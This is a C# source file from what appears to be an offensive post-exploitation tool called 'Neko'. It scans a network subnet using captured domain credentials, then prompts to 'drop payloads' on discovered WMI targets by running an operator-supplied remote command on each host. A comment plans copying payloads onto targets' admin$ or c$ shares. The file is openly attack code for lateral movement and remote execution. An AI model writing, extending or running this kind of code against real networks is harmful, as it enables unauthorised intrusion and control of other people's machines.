﻿using Neko.Information;
using System;
using System.Collections.Generic;
using Neko.UserChoices;
using Neko.Exfiltration;

namespace Neko.Discovery.PortScanning
{
    class PortChoices
    {
        public static void Selections()
        {
            {
                // Get Default gateway
                string localIp = Convert.ToString(Subnet.GetDefaultGateway());

                // Get choice whether user wants to use default gateway or different subnet, then valid
                var ipChoice = Subnet.UserIpChoice(localIp);

                // Get port type selection
                var portChoice = PortScanType.PortSelection();

                // Get stripped IP from ip Choice
                var strippedIp = Subnet.StripIP(ipChoice);

                // Full Scan
                if (portChoice == "1" || portChoice == "2")
                {
                    while (Scanner.Scan(strippedIp, portChoice, UserScanSelection.DiscoveryScanType, DomainAuthentication.Username, DomainAuthentication.Password, GetDomainInfo.DomainURL, SaveLocations.NekoFolder) == true)
                    {

                    }

                    Console.WriteLine("Scanning finished");
                }
                // Selected port scan
                else if (portChoice == "3")
                {
                    while (SelectedPorts.SelectedPortScan(strippedIp, UserScanSelection.DiscoveryScanType, DomainAuthentication.Username, DomainAuthentication.Password, GetDomainInfo.DomainURL, SaveLocations.NekoFolder) == true)
                    {

                    }

                    Console.WriteLine("Scanning finished");
                }

                // See if user wants to drop payloads via WMI
                Console.WriteLine("\r\n" +
                    "Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
                string targetWmi = Console.ReadLine();

                while (targetWmi != "y" && targetWmi != "n" && targetWmi != "exit")
                {
                    Console.WriteLine("\r\n" +
                        "Invalid command. Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
                    targetWmi = Console.ReadLine();
                }
                if (targetWmi == "y")
                {

                    string commandFile = "";
                    Console.WriteLine("\r\n" +
                        "Enter remote command, for example, Notepad.exe, Dir, Shutdown -r:");
                    // Get command from user
                    commandFile = Console.ReadLine();
                    // Need to add - options for deploying payload from local machine and installing it on the targets' admin$ or c$

                    // Attack targets
                    foreach (string target in UserScanSelection.WMITargets)
                    {
                        WMIAttack.Parameters(DomainAuthentication.Username, DomainAuthentication.Password, GetDomainInfo.DomainURL, target, commandFile);
                    }
                }
            }
        }
    }
}
